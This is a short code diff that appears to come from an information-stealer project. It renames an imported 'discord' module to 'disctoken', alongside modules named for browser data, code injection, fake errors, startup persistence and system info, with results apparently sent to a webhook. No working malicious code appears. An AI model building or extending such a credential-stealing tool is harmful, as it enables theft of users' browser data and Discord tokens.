@@ -1,6 +1,6 @@
 from util.chromium import *
 from util.debug import *
-from util.discord import *
+from util.disctoken import *
 from util.exectime import *
 from util.fakeerror import *
 from util.injection import *
@@ -20,7 +20,7 @@ def main(webhook: str) -> None:
         # startup,
         # injection,
         # chromium,
-        # discord,
+        # disctoken,
         # sysinfo,
     ]
 
